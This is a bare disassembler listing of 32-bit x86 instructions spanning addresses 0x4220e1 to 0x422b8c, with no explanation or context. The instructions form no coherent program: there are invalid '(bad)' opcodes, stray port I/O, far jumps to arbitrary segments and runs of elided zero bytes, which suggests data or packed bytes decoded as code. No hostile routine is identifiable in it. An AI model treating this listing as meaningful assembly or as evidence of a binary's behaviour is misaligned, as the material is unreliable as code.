  4220e1:	inc    eax
  4220e2:	dec    edx
  4220e3:	pop    ecx
  4220e4:	rcl    BYTE PTR [esi+0x13],cl
  4220e7:	mov    ecx,0x5ab1ceac
  4220ec:	rol    BYTE PTR [ecx],0xca
  4220ef:	pop    ebp
  4220f0:	mov    ecx,0xeee6c0c0
  4220f5:	push   edi
  4220f6:	out    dx,al
  4220f7:	xor    edx,DWORD PTR [ebp+0x59]
  4220fa:	stos   DWORD PTR es:[edi],eax
  4220fb:	adc    edi,DWORD PTR [edx+0x788f9753]
  422101:	sub    BYTE PTR [eax-0x35],bl
  422104:	dec    edi
  422106:	sbb    ch,cl
  422108:	mov    esi,0xe6bd939f
  42210d:	xchg   edx,eax
  42210e:	xor    eax,DWORD PTR [eax+edx*1-0x54]
  422112:	out    0x4,al
  422114:	jl     0x4220fd
  422116:	pusha  
  422117:	mov    eax,ds:0x6b2e7372
  42211c:	pop    ds
  42211d:	std    
  42211e:	rcl    bh,1
  422120:	push   eax
  422121:	int    0x9f
  422123:	ret    
  422124:	pop    ebp
  422125:	pusha  
  422126:	dec    edi
  422127:	pushf  
  422128:	sbb    cl,ah
  42212a:	rcl    DWORD PTR [edi-0x10146186],0xa3
  422131:	pop    esp
  422132:	push   esp
  422133:	mov    ds:0x8785470a,eax
  422138:	fsubr  QWORD PTR [esi-0x28c855bd]
  42213e:	sub    cl,BYTE PTR [edx-0x13]
  422141:	out    0xc8,eax
  422143:	push   0xffffffb2
  422145:	pop    edi
  422146:	or     BYTE PTR [edi],dh
  422148:	push   edx
  422149:	sub    eax,0xa22ba2eb
  42214e:	dec    DWORD PTR [edi-0x5e3c4931]
  422154:	sahf   
  422155:	mov    esi,0xc24f7d62
  42215a:	sub    ecx,DWORD PTR [eax]
  42215c:	and    al,0xae
  42215e:	mov    esi,0x2ec1c8c4
  422163:	gs push 0xffffffbd
  422166:	std    
  422167:	cmp    al,0x25
  422169:	adc    DWORD PTR [edx+0x1dc223],esp
	...
  4221d3:	add    BYTE PTR [eax],al
  4221d5:	add    BYTE PTR [esi-0x284ae],ah
  4221db:	std    
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	pop    ebx
  4221de:	dec    edx
  4221df:	sub    al,0x42
  4221e1:	sub    esp,DWORD PTR [ebx+ecx*4+0x5a]
  4221e5:	pushf  
  4221e6:	outs   dx,BYTE PTR ds:[si]
  4221e8:	add    DWORD PTR [eax],eax
  4221ea:	add    BYTE PTR [ecx],al
  4221ec:	add    BYTE PTR [eax],al
  4221ee:	dec    eax
  4221ef:	adc    bl,bh
  4221f1:	mov    edx,0x1077a03f
  4221f6:	lods   al,BYTE PTR ds:[esi]
  4221f7:	pop    ss
  4221f8:	loopne 0x42222a
  4221fa:	adc    bh,BYTE PTR [esi+eax*4+0x2a]
  4221fe:	dec    esi
  4221ff:	dec    ebp
  422200:	jo     0x422227
  422202:	mov    WORD PTR [ebx-0x30],es
  422205:	mov    al,ds:0xec5aa0bf
  42220a:	lahf   
  42220b:	or     cl,bh
  42220d:	pinsrw mm4,WORD PTR [ecx],0x3b
  422211:	mov    bl,0xf4
  422213:	sub    al,0xa6
  422215:	lds    edi,FWORD PTR [ecx+0x38311e2]
  42221b:	les    eax,FWORD PTR [edi]
  42221d:	fadd   DWORD PTR [edi+ecx*1-0x6f]
  422221:	or     al,bl
  422223:	stos   BYTE PTR es:[edi],al
  422224:	pop    edx
  422225:	sbb    dh,BYTE PTR [edx+0x604d0136]
  42222b:	dec    ebp
  42222c:	xor    edx,DWORD PTR [esi+0x5f]
  42222f:	jl     0x4221e6
  422231:	enter  0x8d6e,0xe
  422235:	mul    DWORD PTR [ebp-0x20]
  422238:	jne    0x4221cb
  42223a:	and    WORD PTR [ebp-0x1],si
  42223e:	ficom  WORD PTR [ebp-0x410ac8d1]
  422244:	lock bound ebp,QWORD PTR [ebx-0x45f98327]
  42224b:	enter  0x8a8,0x87
  42224f:	pop    esp
  422250:	aaa    
  422251:	repz iret 
  422253:	jl     0x422261
  422255:	aaa    
  422256:	add    esi,ebx
  422258:	push   edx
  422259:	add    ch,dh
  42225b:	sbb    esp,DWORD PTR ds:0x431e68a
  422261:	das    
  422262:	popf   
  422263:	jecxz  0x42223d
  422265:	lock cmc 
  422267:	pop    esp
  422268:	addr16 pushf 
  42226a:	loopne 0x4222af
  42226c:	data16 sub dh,BYTE PTR [ebx-0x37]
  422270:	xchg   DWORD PTR [ebx],edi
  422272:	xor    eax,0x7abf04ee
  422277:	jp     0x4222d8
  422279:	adc    ah,BYTE PTR [edi-0x33]
  42227c:	rcr    BYTE PTR [edi+0x44b4ce15],cl
  422282:	cmc    
  422283:	sbb    al,0x84
  422285:	dec    DWORD PTR [eax-0x7b]
  422288:	xchg   ebp,eax
  422289:	sahf   
  42228a:	ficomp WORD PTR [esi]
  42228c:	pop    ebx
  42228d:	inc    ecx
  42228e:	xor    al,0xdf
  422290:	add    edx,ebp
  422292:	fs gs loop 0x42221b
  422296:	add    al,0x66
  422298:	xor    dl,BYTE PTR [ebx]
  42229a:	sbb    DWORD PTR [ecx-0x695b011b],ebp
  4222a0:	ins    BYTE PTR es:[edi],dx
  4222a1:	retf   0x388f
  4222a4:	cmc    
  4222a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222a6:	enter  0xd97,0xd0
  4222aa:	cmp    DWORD PTR [ebx+0x70],0x78d86b74
  4222b1:	jnp    0x422321
  4222b3:	ror    BYTE PTR [esi+ebx*1-0x76c21e04],0xa
  4222bb:	add    ebx,DWORD PTR [edx]
  4222bd:	push   ebp
  4222be:	les    esi,FWORD PTR [ebx+ecx*1]
  4222c1:	jp     0x422254
  4222c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222c4:	cmp    eax,0xc4b68376
  4222c9:	loope  0x422277
  4222cb:	push   ebp
  4222cc:	adc    ebx,DWORD PTR [ebp-0x5c5ff41c]
  4222d2:	ret    0xc5a8
  4222d5:	pop    esi
  4222d6:	sbb    bl,BYTE PTR [esp+eax*2+0x15e51a16]
  4222dd:	test   DWORD PTR [edi-0x283fa662],edi
  4222e3:	(bad)  [ebx]
  4222e5:	and    DWORD PTR [edx+0x4f5c736d],eax
  4222eb:	and    dh,dh
  4222ed:	sub    al,0x0
	...
  422353:	add    BYTE PTR [eax],al
  422355:	add    BYTE PTR [edi-0x10085213],cl
  42235b:	neg    edi
  42235d:	std    
  42235e:	sub    ebx,DWORD PTR [ebp+0x71]
  422361:	dec    ecx
  422362:	gs shl esi,0xc6
  422366:	outs   dx,DWORD PTR ds:[si]
  422368:	add    DWORD PTR [eax],eax
  42236a:	add    BYTE PTR [ecx],al
  42236c:	add    BYTE PTR [eax],al
  42236e:	push   eax
  42236f:	popa   
  422370:	or     al,0xf
  422372:	loope  0x42234b
  422374:	pop    edi
  422375:	or     ch,BYTE PTR [esi]
  422377:	mov    ch,0x66
  422379:	and    al,al
  42237b:	sti    
  42237c:	test   eax,0x74756c35
  422381:	or     ebp,ebx
  422383:	xchg   esi,eax
  422384:	icebp  
  422385:	out    dx,eax
  422386:	outs   dx,BYTE PTR ds:[esi]
  422387:	xor    DWORD PTR [ebp-0x42],0x5e
  42238b:	mov    eax,ds:0x111afbc4
  422390:	xchg   esi,eax
  422391:	call   0xf5da66c6
  422396:	mov    ss,WORD PTR [edi-0x74f88334]
  42239c:	jmp    0x4a7aa18
  4223a1:	sub    BYTE PTR [ecx-0x6],dl
  4223a4:	mov    edx,DWORD PTR [esi-0x63]
  4223a7:	shl    BYTE PTR [esi],0x58
  4223aa:	add    DWORD PTR [ebp-0x12],ebx
  4223ad:	scas   eax,DWORD PTR es:[edi]
  4223ae:	(bad)  
  4223b0:	pusha  
  4223b1:	sahf   
  4223b2:	add    esi,ecx
  4223b4:	call   FWORD PTR [ebp+0x87d2694]
  4223ba:	sub    esp,esp
  4223bc:	(bad)  
  4223bd:	call   0xdad301dc
  4223c2:	mov    esp,0x1089aa61
  4223c7:	push   eax
  4223c8:	call   0x4c8dde50
  4223cd:	call   0x3da4:0xb224429b
  4223d4:	sar    DWORD PTR [esi+0x60140af4],0xcb
  4223db:	and    al,BYTE PTR ds:0x2a455b84
  4223e1:	nop
  4223e2:	adc    bh,BYTE PTR es:[eax-0x636c329d]
  4223e9:	rcl    DWORD PTR [edi+eax*4-0x34b97838],1
  4223f0:	lods   al,BYTE PTR ds:[esi]
  4223f1:	enter  0xe889,0xc7
  4223f5:	cmp    dh,BYTE PTR [ecx+0x62]
  4223f8:	repnz pop ecx
  4223fa:	sbb    BYTE PTR [ebx],bh
  4223fc:	push   ecx
  4223fd:	dec    esp
  4223fe:	inc    esp
  4223ff:	outs   dx,DWORD PTR ds:[esi]
  422400:	add    BYTE PTR [edi],bl
  422402:	fbstp  TBYTE PTR [esi-0x6f74a5f0]
  422408:	jmp    0xaadd:0x48276fc5
  42240f:	dec    esp
  422410:	xor    al,0x24
  422412:	pusha  
  422413:	sbb    ah,BYTE PTR [esi-0x4c]
  422416:	pop    esp
  422417:	pop    eax
  422419:	out    dx,al
  42241a:	and    ch,BYTE PTR [eax]
  42241c:	mov    esp,0x36f9c3e1
  422421:	ds dec edi
  422423:	sbb    al,0xb7
  422425:	fsubr  DWORD PTR [edi-0x74]
  422428:	pop    ebx
  422429:	and    eax,0xd6b3041a
  42242e:	jmp    0x17821c02
  422433:	stos   DWORD PTR es:[edi],eax
  422434:	iret   
  422435:	jno    0x422440
  422437:	popa   
  422438:	cmp    al,0x4d
  42243a:	aas    
  42243b:	inc    ebx
  42243c:	jb     0x42241c
  42243e:	stc    
  42243f:	push   es
  422440:	loopne 0x422453
  422442:	popa   
  422443:	mov    ch,0x51
  422445:	mov    ch,0x21
  422447:	cmp    bl,BYTE PTR [ecx+eiz*2+0x24121ecf]
  42244e:	daa    
  42244f:	scas   eax,DWORD PTR es:[edi]
  422450:	pop    edi
  422451:	and    ah,BYTE PTR [eax-0x2]
  422454:	and    eax,ebp
  422456:	aaa    
  422457:	inc    ebp
  422458:	loope  0x4224a0
  42245a:	outs   dx,BYTE PTR ds:[esi]
  42245b:	add    eax,0x46da7336
  422460:	scas   eax,DWORD PTR es:[edi]
  422461:	adc    al,0xd6
  422463:	aad    0xa0
  422465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422466:	sbb    cl,BYTE PTR [ecx+0x76]
  422469:	jo     0x4224be
  42246b:	adc    cl,BYTE PTR [esp+ebx*4]
	...
  4224d6:	push   edx
  4224d7:	sub    BYTE PTR [esi],0x69
  4224da:	(bad)  
  4224db:	in     eax,dx
  4224dc:	push   edi
  4224dd:	mov    ebx,0x99e531bb
  4224e2:	into   
  4224e3:	idiv   BYTE PTR [ecx]
  4224e5:	data16 addr16 jo 0x4224ea
  4224e9:	add    BYTE PTR [eax],al
  4224eb:	add    DWORD PTR [eax],eax
  4224ed:	add    BYTE PTR [esi],dl
  4224ef:	jl     0x4224e0
  4224f1:	inc    edi
  4224f2:	aam    0x97
  4224f4:	or     eax,0x23dbd628
  4224f9:	iret   
  4224fa:	out    0x13,al
  4224fc:	mov    DWORD PTR [eax-0x4120174],esp
  422502:	in     al,0x3
  422504:	cld    
  422505:	xor    eax,0x10dff7eb
  42250a:	mov    ebx,?
  42250c:	dec    edx
  42250d:	xchg   esp,eax
  42250e:	mov    bl,cl
  422510:	in     al,0xa3
  422512:	das    
  422513:	loope  0x4224d9
  422515:	in     eax,0xaa
  422517:	gs add eax,0x8827730c
  42251d:	fistp  WORD PTR [edi-0x5c]
  422520:	inc    edi
  422521:	imul   esp,DWORD PTR [ebp+0x24],0xdc2bdb7b
  422528:	aam    0x9e
  42252a:	pop    eax
  42252b:	lock inc esi
  42252d:	or     dh,0x88
  422530:	(bad)  
  422532:	je     0x4224d5
  422534:	outs   dx,BYTE PTR ds:[esi]
  422535:	fs ins DWORD PTR es:[edi],dx
  422537:	pushf  
  422538:	test   DWORD PTR [ecx+0x619761bd],edi
  42253e:	hlt    
  42253f:	fbstp  TBYTE PTR [eax+eiz*1]
  422542:	lods   eax,DWORD PTR ds:[esi]
  422543:	mov    al,0xd4
  422545:	and    DWORD PTR [edi],esp
  422547:	pop    ss
  422548:	pop    es
  422549:	ss clc 
  42254b:	ss aaa 
  42254d:	push   ss
  42254e:	mov    edi,0x3efc8468
  422553:	mov    al,0xdc
  422555:	and    DWORD PTR [edi+edx*4+0x6fc49cb4],ecx
  42255c:	(bad)  
  42255d:	aad    0xe4
  42255f:	js     0x422513
  422561:	and    al,0x4
  422563:	enter  0xf765,0xfb
  422567:	enter  0x65aa,0x27
  42256b:	in     al,0x1
  42256d:	out    dx,al
  42256e:	call   0x14a2:0x6aba7d95
  422575:	mov    ch,0x9
  422577:	jb     0x42251c
  422579:	xor    eax,0x1ad4cf77
  42257e:	inc    esp
  42257f:	pop    ecx
  422580:	lgs    ecx,FWORD PTR [eax]
  422583:	ret    0x36b0
  422586:	mov    bl,0x9
  422588:	test   al,0x36
  42258a:	or     dh,BYTE PTR [ecx+0x74]
  42258d:	sbb    al,0x7c
  42258f:	and    cl,BYTE PTR [eax]
  422591:	cmc    
  422592:	dec    ecx
  422593:	xor    edi,DWORD PTR [ecx]
  422595:	(bad)  
  422596:	xchg   dl,dh
  422598:	mov    ds:0xd225647,eax
  42259d:	inc    ebp
  42259e:	int    0x9c
  4225a0:	shl    DWORD PTR ds:0xbce0b19a,cl
  4225a6:	adc    eax,0x70393ef9
  4225ab:	inc    esi
  4225ac:	inc    esi
  4225ad:	fwait
  4225ae:	lock xor eax,0xdf82f38c
  4225b4:	dec    ecx
  4225b5:	data16 or ch,cl
  4225b8:	xchg   ecx,eax
  4225b9:	cli    
  4225ba:	or     al,0xa8
  4225bc:	jecxz  0x42261f
  4225be:	popf   
  4225bf:	mov    bh,0xb5
  4225c1:	aaa    
  4225c2:	repz pop ebp
  4225c4:	xchg   ebx,eax
  4225c5:	loopne 0x422629
  4225c7:	push   eax
  4225c8:	add    BYTE PTR [ebp+0x21],cl
  4225cb:	lea    esp,[ebp-0x3b30d3e3]
  4225d1:	aas    
  4225d2:	aad    0x5b
  4225d4:	int3   
  4225d5:	(bad)  
  4225d7:	dec    esp
  4225d8:	leave  
  4225d9:	sub    dl,BYTE PTR [esi]
  4225db:	mov    eax,ds:0xeb9eaa65
  4225e0:	sahf   
  4225e1:	lds    eax,FWORD PTR ds:0xf9ab50f9
  4225e7:	xlat   BYTE PTR ds:[ebx]
  4225e8:	dec    esi
  4225e9:	scas   al,BYTE PTR es:[edi]
  4225ea:	mov    bl,0xc1
  4225ec:	jae    0x422600
	...
  422656:	call   0xfa77:0xbf778fae
  42265d:	out    dx,eax
  42265e:	sbb    esi,DWORD PTR [ecx-0x9a5d08]
  422664:	out    dx,eax
  422665:	das    
  422666:	addr16 jno 0x42266a
  422669:	add    BYTE PTR [eax],al
  42266b:	add    DWORD PTR [eax],eax
  42266d:	add    bl,dl
  42266f:	add    DWORD PTR [edx+eiz*1+0x6c4cadf3],edx
  422676:	xchg   DWORD PTR [eax],esi
  422678:	mov    eax,ds:0x10933298
  42267d:	call   0xf9a9:0xc8ee8a55
  422684:	xlat   BYTE PTR ds:[ebx]
  422685:	xchg   DWORD PTR [ecx],ebp
  422687:	or     dh,al
  422689:	add    DWORD PTR [ecx+0x74],0x416fa8ec
  422690:	inc    esi
  422691:	jge    0x4226f6
  422693:	not    DWORD PTR [edx+0x2fe2c504]
  422699:	les    esp,FWORD PTR [edi-0x41f0cea1]
  42269f:	or     cl,0x7b
  4226a2:	inc    ebx
  4226a3:	in     eax,0xa7
  4226a5:	cmp    esi,ebp
  4226a7:	add    eax,0x6873590d
  4226ac:	out    0x37,al
  4226ae:	dec    ecx
  4226af:	adc    DWORD PTR [edi-0x6],ebx
  4226b2:	sub    DWORD PTR [esp+ebx*2],ebx
  4226b5:	ins    BYTE PTR es:[edi],dx
  4226b6:	enter  0x5190,0x44
  4226ba:	add    al,0x1e
  4226bc:	lahf   
  4226bd:	mov    ebp,0x44d2b88b
  4226c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c3:	enter  0xcf61,0x8c
  4226c7:	sub    esp,eax
  4226c9:	dec    ecx
  4226ca:	mov    edx,0xfb952abf
  4226cf:	cmp    eax,0x41ace271
  4226d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226d5:	pop    ecx
  4226d6:	(bad)  
  4226d7:	hlt    
  4226d8:	pop    esi
  4226d9:	shr    ebp,cl
  4226db:	fnsave [ecx+eiz*8]
  4226de:	imul   edi,DWORD PTR [eax+0x68e83ae],0xc7f95a69
  4226e8:	or     BYTE PTR [eax+0x4a],0xf5
  4226ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226ed:	add    al,0xb3
  4226ef:	mov    eax,ds:0xd3eba36b
  4226f4:	sbb    BYTE PTR [edx],cl
  4226f6:	rol    esp,cl
  4226f8:	retf   
  4226f9:	push   ebp
  4226fa:	pop    ds
  4226fb:	or     al,0xef
  4226fd:	mov    eax,ds:0xadb0d52a
  422702:	cs xor eax,ebp
  422705:	push   edi
  422706:	outs   dx,BYTE PTR ds:[esi]
  422707:	ins    DWORD PTR es:[edi],dx
  422708:	sahf   
  422709:	inc    ebx
  42270a:	adc    eax,edi
  42270c:	in     al,dx
  42270d:	dec    BYTE PTR [esi+0x7d]
  422710:	add    BYTE PTR [ebx+eiz*8+0x41],dh
  422714:	cmp    BYTE PTR [ecx],al
  422716:	xchg   esi,eax
  422717:	dec    edi
  422718:	cmp    al,0x29
  42271a:	je     0x42271f
  42271c:	aam    0x56
  42271e:	and    eax,0x950e1a79
  422723:	dec    ecx
  422724:	jmp    0xd3a5f22a
  422729:	jae    0x4226b3
  42272b:	mov    dh,0x9d
  42272d:	or     al,0x54
  42272f:	and    BYTE PTR [ecx-0x280eb583],dh
  422735:	pop    es
  422736:	jmp    0x6eba:0xba229878
  42273d:	sub    eax,0xfd7fb22
  422742:	mov    ebx,0xa278ebef
  422747:	(bad)  
  422748:	sub    esi,DWORD PTR [ecx-0x1427423a]
  42274e:	sbb    ah,BYTE PTR [edi-0x7bfaa540]
  422754:	(bad)  
  422755:	mov    ebp,0x60a79a39
  42275a:	cs jns 0x4227d5
  42275d:	es repnz mov esi,0x33742742
  422764:	(bad)  
  422765:	repnz xor eax,0x718d2a9
  42276b:	pusha  
  42276c:	pop    esi
  42276d:	xor    DWORD PTR [eax],eax
	...
  4227d3:	add    BYTE PTR [eax],al
  4227d5:	add    BYTE PTR [edi],ah
  4227d7:	sub    eax,0x7d7f2d7d
  4227dc:	ja     0x42280d
  4227de:	mov    esi,0x8f7f01c8
  4227e3:	dec    esi
  4227e4:	xchg   edx,eax
  4227e5:	inc    ebx
  4227e6:	addr16 jb 0x4227ea
  4227e9:	add    BYTE PTR [eax],al
  4227eb:	add    DWORD PTR [eax],eax
  4227ed:	add    BYTE PTR [ebx+0x54da0667],al
  4227f3:	dec    esi
  4227f4:	jp     0x422786
  4227f6:	and    eax,0xaeaf0999
  4227fb:	int3   
  4227fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227fd:	push   eax
  4227fe:	outs   dx,BYTE PTR ds:[esi]
  4227ff:	xchg   DWORD PTR [eax+0x5d29fbf3],ecx
  422805:	mov    al,0x91
  422807:	fadd   DWORD PTR ds:0xec948d06
  42280d:	dec    ecx
  42280e:	popa   
  42280f:	jecxz  0x422854
  422811:	push   edi
  422812:	pushf  
  422813:	dec    esp
  422814:	jne    0x42282d
  422816:	mov    edi,0x38f466d8
  42281b:	fwait
  42281c:	mov    dl,0x6f
  42281e:	je     0x42280e
  422820:	pop    eax
  422821:	pop    ss
  422822:	rcr    dl,0xf6
  422825:	std    
  422826:	inc    edx
  422827:	mov    ebx,?
  422829:	and    al,0x8e
  42282b:	sbb    al,0x46
  42282d:	xor    ch,bl
  42282f:	inc    edi
  422830:	cmp    ebp,edi
  422832:	and    DWORD PTR ds:0x2151928a,esi
  422838:	or     BYTE PTR [ebx],dl
  42283a:	repz jmp 0x7a18:0xc702b2f6
  422842:	out    dx,eax
  422843:	xchg   ebx,eax
  422844:	mov    ebp,0x20f6494a
  422849:	aaa    
  42284a:	aas    
  42284b:	sti    
  42284c:	add    esp,DWORD PTR [edx+0x425cea58]
  422852:	jp     0x422848
  422854:	jae    0x422876
  422856:	aad    0xdb
  422858:	or     BYTE PTR [eax-0x1f],0x27
  42285c:	es cmp al,0xfb
  42285f:	pop    ecx
  422860:	loopne 0x42288f
  422862:	je     0x422845
  422864:	pop    ebx
  422865:	inc    eax
  422866:	loope  0x422882
  422868:	jae    0x4228ac
  42286a:	add    BYTE PTR [edx+0x72fad3c5],al
  422870:	and    bh,BYTE PTR [ebx-0x68]
  422873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422874:	test   BYTE PTR [ecx],0xfd
  422877:	push   ss
  422878:	jl     0x422897
  42287a:	xchg   BYTE PTR [ecx-0x26],ah
  42287d:	enter  0x6259,0x57
  422881:	add    al,0x41
  422883:	aam    0x5b
  422885:	dec    ebp
  422886:	and    eax,0x44d8d2e0
  42288b:	call   0x3ec75518
  422890:	cli    
  422891:	es icebp 
  422893:	jge    0x4228f8
  422895:	and    al,0x4
  422897:	mov    dh,0xe3
  422899:	arpl   WORD PTR [ebx+0x5e],si
  42289c:	jbe    0x4228fe
  42289e:	mov    BYTE PTR [ecx+0x4],dl
  4228a1:	mov    esi,0xface04c8
  4228a6:	dec    esi
  4228a7:	adc    DWORD PTR ds:0xbe6d46d0,eax
  4228ad:	leave  
  4228ae:	dec    ecx
  4228af:	xchg   dl,bl
  4228b1:	push   ds
  4228b2:	lds    ebp,FWORD PTR [edi-0x79]
  4228b5:	shl    esi,cl
  4228b7:	sub    BYTE PTR [ebp-0x2dda625a],cl
  4228bd:	cmp    esp,DWORD PTR [ecx+0x25]
  4228c0:	inc    esi
  4228c1:	mov    esp,0x70b86f9b
  4228c6:	aaa    
  4228c7:	loope  0x4228f6
  4228c9:	dec    esi
  4228ca:	sub    eax,0xeace346
  4228cf:	add    eax,0x65787db1
  4228d4:	sub    DWORD PTR [ebp+0x2dc214f],ebp
  4228da:	call   0xd035:0x1320b826
  4228e1:	jns    0x422911
  4228e3:	xlat   BYTE PTR ds:[ebx]
  4228e4:	push   ebx
  4228e5:	inc    eax
  4228e6:	jno    0x42293d
  4228e8:	mov    eax,0x4a5b3be4
  4228ed:	pusha  
	...
  422956:	int    0x39
  422958:	mov    eax,0xef97fc97
  42295d:	jnp    0x42291d
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422961:	loopne 0x4229e0
  422963:	fdiv   DWORD PTR [ecx+eiz*2]
  422966:	addr16 jae 0x42296a
  422969:	add    BYTE PTR [eax],al
  42296b:	add    DWORD PTR [eax],eax
  42296d:	add    bl,cl
  42296f:	jae    0x422926
  422971:	sbb    al,0x4a
  422973:	ret    
  422974:	stos   DWORD PTR es:[edi],eax
  422975:	data16 mov bh,0x52
  422978:	les    ebx,FWORD PTR ds:0xd933802e
  42297e:	jno    0x422950
  422980:	std    
  422981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422982:	add    ch,bl
  422984:	pushf  
  422985:	out    dx,eax
  422986:	addr16 mov eax,0x8a219f11
  42298c:	(bad)  
  42298d:	outs   dx,BYTE PTR ds:[esi]
  42298e:	push   0x3cc73494
  422993:	sub    ebx,ebp
  422995:	or     al,0x48
  422997:	call   0xc7415540
  42299c:	aas    
  42299d:	push   cs
  42299e:	mov    dh,0x95
  4229a0:	adc    al,0xcd
  4229a2:	push   ebx
  4229a3:	dec    eax
  4229a4:	les    ecx,FWORD PTR [esi]
  4229a6:	fsubr  st,st(3)
  4229a8:	or     al,0xc
  4229aa:	or     al,0xdb
  4229ac:	mov    al,ds:0xedc48660
  4229b1:	adc    al,0xbf
  4229b3:	mov    esi,0xca907c3c
  4229b8:	lock sub BYTE PTR [ecx],bl
  4229bb:	push   ebp
  4229bc:	outs   dx,BYTE PTR ds:[esi]
  4229bd:	ficomp DWORD PTR [edi]
  4229bf:	push   edi
  4229c0:	pushf  
  4229c1:	mov    ch,0x13
  4229c3:	pop    es
  4229c4:	mov    ch,0x95
  4229c6:	push   cs
  4229c7:	je     0x4229b6
  4229c9:	sub    bl,bh
  4229cb:	scas   eax,DWORD PTR es:[edi]
  4229cc:	or     al,BYTE PTR [ebx-0x39]
  4229cf:	test   BYTE PTR [eax],bh
  4229d1:	sub    esi,DWORD PTR [ecx+0x55]
  4229d4:	jb     0x42299e
  4229d6:	xchg   edi,eax
  4229d7:	out    dx,eax
  4229d8:	xor    eax,0xb483c5d5
  4229dd:	mov    bh,0xf
  4229df:	ffree  st(2)
  4229e1:	push   ebp
  4229e2:	jge    0x4229bc
  4229e4:	repnz mov DWORD PTR [ebx+0x26],0xa0bf7c15
  4229ec:	dec    esi
  4229ed:	shl    ecx,cl
  4229ef:	stos   BYTE PTR es:[edi],al
  4229f0:	clc    
  4229f1:	jns    0x4229ae
  4229f3:	mov    ebp,0xd7f0427a
  4229f8:	fidivr WORD PTR [ebp-0x3e917ce3]
  4229fe:	xchg   ebx,eax
  4229ff:	jns    0x422995
  422a01:	mov    esp,0x5cf10335
  422a06:	jl     0x422a22
  422a08:	sbb    eax,0x2a7808f9
  422a0d:	fsub   st(6),st
  422a0f:	stos   DWORD PTR es:[edi],eax
  422a10:	mov    ds:0xf70bac16,eax
  422a15:	sahf   
  422a16:	ds out dx,al
  422a18:	daa    
  422a19:	xlat   BYTE PTR ds:[ebx]
  422a1a:	pop    esp
  422a1b:	cmp    ebx,DWORD PTR [eax]
  422a1d:	pop    ebp
  422a1e:	test   eax,0xde5c222c
  422a23:	shl    cl,cl
  422a25:	pop    esp
  422a26:	scas   eax,DWORD PTR es:[edi]
  422a27:	cmp    eax,0xbf59eb98
  422a2c:	nop
  422a2d:	mov    dl,0x3f
  422a2f:	or     dh,ah
  422a31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a32:	jecxz  0x422a00
  422a34:	ror    BYTE PTR [edx+edx*2+0x72],1
  422a38:	sbb    ecx,esi
  422a3a:	push   es
  422a3b:	loopne 0x422aac
  422a3d:	inc    edx
  422a3e:	xor    BYTE PTR [eax+0x39],ch
  422a41:	rcr    esi,1
  422a43:	mov    dl,0x9b
  422a45:	xor    eax,0xffa9b708
  422a4a:	out    0x18,eax
  422a4c:	dec    eax
  422a4d:	pop    ebx
  422a4e:	and    cl,BYTE PTR [ebp+0x65]
  422a51:	loopne 0x4229f2
  422a53:	xchg   ecx,eax
  422a54:	cmp    BYTE PTR [edx-0x3e059fde],bl
  422a5a:	xchg   ebp,eax
  422a5b:	gs sub ch,dl
  422a5e:	sub    BYTE PTR [ecx],ah
  422a60:	jecxz  0x4229f1
  422a62:	jl     0x422a3a
  422a64:	iret   
  422a65:	nop
  422a66:	mov    ds:0xf5273506,al
  422a6b:	ins    DWORD PTR es:[edi],dx
  422a6c:	cs add eax,0x0
	...
  422ad6:	xchg   esi,eax
  422ad7:	push   0x18
  422ad9:	mov    ah,bh
  422adb:	cli    
  422adc:	xchg   esi,eax
  422add:	jle    0x422ab0
  422adf:	push   esp
  422ae0:	je     0x422a9f
  422ae2:	scas   eax,DWORD PTR es:[edi]
  422ae3:	enter  0xb0c0,0x67
  422ae7:	je     0x422aea
  422ae9:	add    BYTE PTR [eax],al
  422aeb:	add    DWORD PTR [eax],eax
  422aed:	add    BYTE PTR [edx],ch
  422aef:	mov    edi,0xb7574162
  422af4:	lahf   
  422af5:	and    al,0xfe
  422af7:	rol    BYTE PTR [edi],1
  422af9:	test   BYTE PTR [edx-0x52a9268],dl
  422aff:	cmp    eax,0x6d4b2ff5
  422b04:	jne    0x422b00
  422b06:	das    
  422b07:	sub    al,0xfe
  422b09:	add    al,0x5e
  422b0b:	mov    ebx,0xbf913c15
  422b10:	pop    esi
  422b11:	hlt    
  422b12:	push   ecx
  422b13:	fstp   QWORD PTR [edx]
  422b15:	test   DWORD PTR [eax+ebx*1+0x7f],eax
  422b19:	or     BYTE PTR [ecx+ebx*8+0x7b1e1189],ch
  422b20:	or     ecx,edx
  422b22:	cmp    al,0xfa
  422b24:	popf   
  422b25:	mov    eax,ds:0x7d96512d
  422b2a:	retf   
  422b2b:	aam    0x56
  422b2d:	sbb    bl,BYTE PTR [esi+0x6f]
  422b30:	daa    
  422b31:	and    al,0x82
  422b33:	test   eax,0x871c1ea1
  422b38:	mov    gs,edx
  422b3a:	sbb    eax,ebx
  422b3c:	sahf   
  422b3d:	push   0x43399f96
  422b42:	repz jnp 0x422b9b
  422b45:	inc    ecx
  422b46:	push   ecx
  422b47:	in     al,dx
  422b48:	ds pop esp
  422b4a:	call   0xd9fb:0x29709643
  422b51:	cmp    al,0xbc
  422b53:	pop    es
  422b54:	cld    
  422b55:	std    
  422b56:	divps  xmm0,XMMWORD PTR [edx-0x72eef290]
  422b5d:	jo     0x422b62
  422b5f:	stc    
  422b60:	jp     0x422aec
  422b62:	mov    DWORD PTR [eax-0x7fb431df],edi
  422b68:	sbb    al,0xa7
  422b6a:	mov    edx,0x356b2b69
  422b6f:	push   eax
  422b70:	lock out dx,eax
  422b72:	push   edx
  422b73:	jmp    0x6302:0x38f5bec7
  422b7a:	jp     0x422b4b
  422b7c:	mov    cl,0x7e
  422b7e:	into   
  422b7f:	mov    dl,0x7
  422b81:	dec    ebx
  422b82:	sub    bl,0x11
  422b85:	push   ss
  422b86:	ret    0x9314
  422b89:	ret    0x6462
  422b8c:	jns    0x422bac
